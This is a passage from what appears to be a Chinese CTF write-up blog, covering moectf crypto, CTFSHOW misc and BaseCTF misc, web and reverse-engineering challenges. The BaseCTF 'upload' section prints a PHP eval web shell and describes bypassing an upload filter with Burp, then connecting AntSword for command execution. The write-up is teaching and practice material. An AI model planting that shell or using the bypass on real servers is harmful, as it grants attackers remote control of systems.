8 个线程<br>        for candidate in itertools.product(charset, repeat=remaining_length):<br>            candidate_suffix = &#x27;&#x27;.join(candidate)<br>            future = executor.submit(hash_crack, candidate_suffix)<br>            result = future.result()<br>            if result:<br>                print(f&quot;Found matching secret: &#123;result&#125;&quot;)<br>                return  # 找到结果后终止<br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727008101193-86868691-7506-4fee-9ce5-ee3f7f95f312-473370.png" alt="1727008101193-86868691-7506-4fee-9ce5-ee3f7f95f312.png"></p><p>moectf{2100360168}</p><h2 id="Big-and-small-e很小"><a href="#Big-and-small-e很小" class="headerlink" title="Big and small(e很小)"></a>Big and small(e很小)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">from secret import flag<br>from Crypto.Util.number import*<br>m = long_to_bytes(flag)<br>p = getPrime(1024)<br>q = getPrime(1024)<br>n = p*q<br>e = 3<br>c = pow(m,e,n)<br>&#x27;&#x27;&#x27;<br>c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757<br>e = 3<br>n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">import gmpy2<br>from Crypto.Util.number import *<br><br><br>def de(c, e, n):<br>    k = 0<br>    while True:<br>        m = c + n * k<br>        result, flag = gmpy2.iroot(m, e)<br>        if True == flag:<br>            return result<br>        k += 1<br><br><br>e = 3<br>n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787<br>c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757<br>m = de(c, e, n)<br>print(m)<br>print(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727008361717-61875a44-0155-4272-ad4a-ddc279b328ae-422149.png" alt="1727008361717-61875a44-0155-4272-ad4a-ddc279b328ae.png"></p><blockquote><p>更新: 2024-12-24 15:33:07<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/urkfd9mddfu6ve0z">https://www.yuque.com/chaye-apqbl/vsc85q/urkfd9mddfu6ve0z</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/CTFSHOW%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
    <url>/2026/01/19/WP/2024/CTFSHOW%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW菜狗杯"><a href="#CTFSHOW菜狗杯" class="headerlink" title="CTFSHOW菜狗杯"></a>CTFSHOW菜狗杯</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="010的使用"><a href="#010的使用" class="headerlink" title="010的使用"></a>010的使用</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>用010打开直接搜索文本ctfshow即可</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721115391938-3cfd2fdc-8d22-4299-b9c8-f51c162bff98-346350.png" alt="1721115391938-3cfd2fdc-8d22-4299-b9c8-f51c162bff98.png"></p><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721115499041-db91b620-5222-4d7d-aeaf-bf0cfd7db060-730357.png" alt="1721115499041-db91b620-5222-4d7d-aeaf-bf0cfd7db060.png"></p><p>发现txt文件原来的后缀应该是png，将后缀改成png即可</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721115563315-93a36208-4e12-4d4e-95b9-3f7f598d111c-475844.png" alt="1721115563315-93a36208-4e12-4d4e-95b9-3f7f598d111c.png"></p><h3 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h3><p>用010打开，然后compare两个png</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721116648753-65f4e5ca-e52b-454b-a5c5-7dcc6d5b0d49-479823.png" alt="1721116648753-65f4e5ca-e52b-454b-a5c5-7dcc6d5b0d49.png"></p><p>然后两串都各取一个个下来得到flag</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721117046170-3fd22445-251a-48c4-acd1-9a46ca34b4a4-033738.png" alt="1721117046170-3fd22445-251a-48c4-acd1-9a46ca34b4a4.png"></p><h3 id="MISC4"><a href="#MISC4" class="headerlink" title="MISC4"></a>MISC4</h3><p>使用010editor的 工具→直方图 统计计数解得flag，或者复制出来词频统计,按照percent降序排序导出数据即可</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721117515834-681fd36e-b34e-439f-b73f-be3ab399f29c-861953.png" alt="1721117515834-681fd36e-b34e-439f-b73f-be3ab399f29c.png"></p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721117786187-5e3f794e-eac1-4d41-be01-f67b74c1a025-296282.png" alt="1721117786187-5e3f794e-eac1-4d41-be01-f67b74c1a025.png">ctfshow{a1b2d3e4g56i7j8k9l0}</p><h3 id="MISC5"><a href="#MISC5" class="headerlink" title="MISC5"></a>MISC5</h3><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721119130109-2a7adb7e-b39e-443e-a477-3fed0c80cbba-424107.png" alt="1721119130109-2a7adb7e-b39e-443e-a477-3fed0c80cbba.png"></p><p>异或数据：0x50</p><p><font style="color:rgb(77, 77, 77);">只要选中所有的数据 点开菜单-&gt;工具-&gt;十六进制操作-&gt;二进制异或 修改处理数据为无符号 十六进制 然后对0x50进行异或</font></p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721119224967-a58ab500-8cdb-41ab-ad37-1fe9438ac64c-654976.png" alt="1721119224967-a58ab500-8cdb-41ab-ad37-1fe9438ac64c.png"></p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721119214109-32a5f4c0-bbc2-4927-88a2-12214bfe7937-111230.png" alt="1721119214109-32a5f4c0-bbc2-4927-88a2-12214bfe7937.png"></p><p>save后打开就可以得到flag</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721119272770-cb961f33-0c79-4110-affa-d01ab2595ef4-325266.png" alt="1721119272770-cb961f33-0c79-4110-affa-d01ab2595ef4.png"></p><p>ctfshow{030d0f5073ab4681d30866d1fdf10ab1}</p><h3 id="miku"><a href="#miku" class="headerlink" title="miku"></a>miku</h3><p>用watermark去除水印，得到一半</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721119987524-b0b7b39e-24f0-4c50-8714-21c132c3f2ee-153182.png" alt="1721119987524-b0b7b39e-24f0-4c50-8714-21c132c3f2ee.png"></p><p>ctfshow{FirstP@RT</p><p>后半部分将高度改高即可，前4位为宽度，后四位为高度</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721120119311-5a265280-9cdd-4998-9f11-7758fff9b109-564861.png" alt="1721120119311-5a265280-9cdd-4998-9f11-7758fff9b109.png"></p><p>改成0500即可</p><p><img src="/./img/49277317_BebCWqOjXqa7A4Ia/1721120199969-c2ba0a69-a9ca-452b-88d1-4bad0267ebd8-130311.png" alt="1721120199969-c2ba0a69-a9ca-452b-88d1-4bad0267ebd8.png"></p><p>SecondP@rTMikumiku~}</p><p>ctfshow{FirstP@RTSecondP@rTMikumiku~}</p><blockquote><p>更新: 2024-07-16 16:58:10<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zadr05etxcecbh5l">https://www.yuque.com/chaye-apqbl/vsc85q/zadr05etxcecbh5l</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/BASEctf/"/>
    <url>/2026/01/19/WP/2024/BASEctf/</url>
    
    <content type="html"><![CDATA[<h1 id="BASEctf"><a href="#BASEctf" class="headerlink" title="BASEctf"></a>BASEctf</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p><p>jpg 文件头 FF D8 FF E0</p><p>文件尾是 FF D9 </p><p>D9FF</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e-519815.png" alt="1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0-122780.png" alt="1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509-901571.png" alt="1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png"></p><p><font style="color:#DF2A3F;">可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</font></p><p><font style="color:#DF2A3F;">如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</font></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6-442228.png" alt="1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png"></p><p><font style="color:rgb(77, 77, 77);">选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\网站下载\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\网站下载\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\网站下载\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\网站下载\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c-064577.png" alt="1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png"></p><p><font style="color:#DF2A3F;">导入十六进制，保存，修改后缀名为jpg，</font><font style="color:rgb(77, 77, 77);">（文件→导入十六进制→保存→重命名为flag.jpg)</font></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b-516257.png" alt="1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png"></p><p>得到照片</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc-361037.jpeg" alt="1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252-201019.png" alt="1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a-903640.png" alt="1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png"></p><p>打开就可以看到啦</p><p><font style="color:rgb(77, 77, 77);"></font></p><h2 id="你也喜欢圣物吗"><a href="#你也喜欢圣物吗" class="headerlink" title="你也喜欢圣物吗"></a>你也喜欢圣物吗</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff-138558.png" alt="1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31-649330.png" alt="1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31.png"></p><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37-409974.png" alt="1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37.png"></p><p>还可以用zsteg</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5-439854.png" alt="1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5.png"></p><p>拿到key解开zip</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b-311184.png" alt="1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238-204331.png" alt="1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238.png"></p><p>真正的flag在txt下面（wcnmd）</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c-239596.png" alt="1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14-345393.png" alt="1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14.png"></p><h2 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723700567511-9ad81ae1-ba26-4d1d-9744-85f18a01de88-860591.png" alt="1723700567511-9ad81ae1-ba26-4d1d-9744-85f18a01de88.png"></p><h2 id="海上遇到了鲨鱼"><a href="#海上遇到了鲨鱼" class="headerlink" title="海上遇到了鲨鱼"></a>海上遇到了鲨鱼</h2><p>追踪tcp流，然后倒序输出就行</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723700310858-93b48e05-f327-4e19-8368-0b65e44ab2cb-608384.png" alt="1723700310858-93b48e05-f327-4e19-8368-0b65e44ab2cb.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;&#125;67bf613763ca-50b3-4437-7a3a-b683fe51&#123;FTCesaB&#x27;<br>print(a[::-1])<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723700409017-8c0d25aa-0848-420c-b759-8a1aaac9fcdf-273305.png" alt="1723700409017-8c0d25aa-0848-420c-b759-8a1aaac9fcdf.png"></p><h2 id="捂住X只耳"><a href="#捂住X只耳" class="headerlink" title="捂住X只耳"></a>捂住X只耳</h2><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c-152595.png" alt="1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a-556728.png" alt="1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723789577517-e99d9957-f220-438a-8ca0-67e581712d40-091435.png" alt="1723789577517-e99d9957-f220-438a-8ca0-67e581712d40.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2-537047.png" alt="1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723792234932-c1f630e2-3618-4624-9e59-82e523a49066-265623.png" alt="1723792234932-c1f630e2-3618-4624-9e59-82e523a49066.png"></p><h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><p>查看源代码即可</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723790165788-815a3da9-3429-4422-ae06-75a0ed54b803-352690.png" alt="1723790165788-815a3da9-3429-4422-ae06-75a0ed54b803.png"></p><h2 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723790297615-5a4bd355-f9f5-4260-9732-63e764528d57-722885.png" alt="1723790297615-5a4bd355-f9f5-4260-9732-63e764528d57.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723795805377-0ffdfa60-121f-4f40-a9ab-00f371c7a769-740273.png" alt="1723795805377-0ffdfa60-121f-4f40-a9ab-00f371c7a769.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723795822023-44bc8437-817b-4b61-a9b6-c0faf520e1a7-810208.png" alt="1723795822023-44bc8437-817b-4b61-a9b6-c0faf520e1a7.png"></p><h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef-488718.png" alt="1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9-307990.png" alt="1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f-473299.png" alt="1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a><font style="color:#DF2A3F;background-color:#FBDE28;"><?php @eval($_POST['cmd']); ?></font></h3><p><font style="color:#000000;"><?php?>是php的固定规范写法</font></p><p><font style="color:#000000;">@表示后面如果执行错误不会报错</font></p><p><font style="color:#000000;">eval()函数表示</font><font style="color:#000000;background-color:#FBDE28;">括号里的语句字符串为执行代码</font></p><p><font style="color:#000000;">&amp;_POST[‘cmd’]表示从页面中以post方式接受变量cmd</font></p><p><font style="color:#000000;">cmd是蚁剑的连接密码</font></p><p><font style="color:#000000;"></font></p><h3 id="先写一句木马，传入木马文件"><a href="#先写一句木马，传入木马文件" class="headerlink" title="先写一句木马，传入木马文件"></a>先写一句木马，<font style="color:#000000;">传入木马文件</font></h3><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9-582028.png" alt="1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a-159852.png" alt="1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a.png"></p><p>要上传照片，所以改成jpg</p><p>然后用burp抓包截取，将改成php（像这样）</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534-390793.webp" alt="1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534.png"></p><p>传入后连接蚁剑</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba-314858.png" alt="1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba.png"></p><p><font style="color:#DF2A3F;">这里的意思是将传入的文件保存到uploads目录下面</font></p><p><font style="color:#DF2A3F;">注意他这里要访问到传入php的文件地址</font></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0-399361.png" alt="1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0.png"></p><p>测试连接成功后就可以查找flag了，就在根目录下面</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724043316235-079eff0b-6067-4002-807c-b972a96ba727-518109.png" alt="1724043316235-079eff0b-6067-4002-807c-b972a96ba727.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723716996028-c4898f89-83ff-481a-82a7-639589ffe6f1-086222.png" alt="1723716996028-c4898f89-83ff-481a-82a7-639589ffe6f1.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723717176777-bf9d51a5-9df8-4a30-bbe0-fef369fcf2ce-528441.png" alt="1723717176777-bf9d51a5-9df8-4a30-bbe0-fef369fcf2ce.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723717153510-76fe3d15-9917-44f4-abf9-1b7ce0f936d9-987686.png" alt="1723717153510-76fe3d15-9917-44f4-abf9-1b7ce0f936d9.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723717372424-b7212e6a-9178-4e1d-b7ef-e64a670f5a0b-948035.png" alt="1723717372424-b7212e6a-9178-4e1d-b7ef-e64a670f5a0b.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723717391740-0464189d-8cfb-4486-b997-fc10fee6b7b9-869925.png" alt="1723717391740-0464189d-8cfb-4486-b997-fc10fee6b7b9.png"></p><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h2 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723720497439-dd92058e-0e93-4f2b-997d-d990d70408c0-532667.png" alt="1723720497439-dd92058e-0e93-4f2b-997d-d990d70408c0.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723720599630-543dca3c-704d-449c-b73c-d6d2fd0d4556-110035.png" alt="1723720599630-543dca3c-704d-449c-b73c-d6d2fd0d4556.png"></p><p>base解码即可</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723720632310-0566c1e8-e404-4186-91e2-cd89b1711451-041254.png" alt="1723720632310-0566c1e8-e404-4186-91e2-cd89b1711451.png"></p><h2 id="ez-xor"><a href="#ez-xor" class="headerlink" title="ez_xor"></a>ez_xor</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724038834954-71c5afd9-7e76-4de9-aaa9-82649b584458-048406.png" alt="1724038834954-71c5afd9-7e76-4de9-aaa9-82649b584458.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724039139378-bab032d3-fecc-4d0a-b6d3-a6efbd5514c0-928564.png" alt="1724039139378-bab032d3-fecc-4d0a-b6d3-a6efbd5514c0.png"></p><p>看汇编提取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[0x1,0x9,0x5,0x25,0x26,0x2d,0x0b,0x1d,0x24,0x7a,0x31,0x20,0x1e,0x49,0x3d,0x67,0x4d,0x50,0x8,0x25,0x2e,0x6e,0x5,0x34,0x22,0x40,0x3b,0x25]<br>print(len(a))<br>b=[]<br>v5=[0x58,0x6f,0x72]<br># 第一个循环：生成 b 列表的字符并打印<br>for i in range(28):<br>    b.append(i ^ (v5[i % 3]))<br>    print(chr(b[i] % 256), end=&#x27;&#x27;)<br>print(&quot;\n&quot;)<br># 第二个循环：将 a[i] 和 c[28-i-1] 异或，转换为字符并打印<br>for i in range(28):<br>    a[i] ^= b[28 - i - 1]<br>    print(chr(a[i]), end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724039385190-c7ba5903-0963-413c-ab43-ddfeb3732a6e-877576.png" alt="1724039385190-c7ba5903-0963-413c-ab43-ddfeb3732a6e.png"></p><h2 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723720756607-c5e3f750-28f2-4bf6-9231-b4d11ff18709-265814.png" alt="1723720756607-c5e3f750-28f2-4bf6-9231-b4d11ff18709.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723721129646-be7dfa2c-b212-421b-bda3-d8cdb3bffa5b-289580.png" alt="1723721129646-be7dfa2c-b212-421b-bda3-d8cdb3bffa5b.png"></p><p>小写的md5</p><p><img 